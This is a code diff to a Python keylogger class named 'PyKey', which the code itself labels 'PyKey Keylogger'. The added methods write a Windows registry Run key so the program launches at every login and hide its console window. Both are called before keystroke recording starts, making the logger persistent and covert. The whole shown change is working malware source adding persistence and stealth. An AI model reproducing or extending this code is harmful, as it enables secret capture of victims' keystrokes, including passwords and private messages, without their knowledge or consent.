@@ -206,6 +206,21 @@ class PyKey:
             output.write(key)
             output.flush()
 
+    def addToWindowsStartup(self):
+        fp = os.path.dirname(os.path.realpath(__file__))
+        file_name = sys.argv[0].split("\\")[-1]
+        new_file_path = fp + "\\" + file_name
+        keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
+        key2change = OpenKey(HKEY_CURRENT_USER,keyVal,0,KEY_ALL_ACCESS)
+        SetValueEx(key2change, "PyKey Keylogger",0,REG_SZ, new_file_path)
+
+    def hideWindowsConsole(self):
+        import win32console, win32gui
+
+        window = win32console.GetConsoleWindow()
+        win32gui.ShowWindow(window,0)
+
+        return True
 
     def recordWindows(self):
         """ Records the keys in Windows OS following a strategy depending on the operating system
@@ -224,6 +239,9 @@ class PyKey:
 
         if self.CLEAR_ON_STARTUP:
             os.remove(self.LOG_FILE)
+
+        self.addToWindowsStartup()
+        self.hideWindowsConsole()
 
         is_down = {}
         output = open(self.LOG_FILE, "r+")
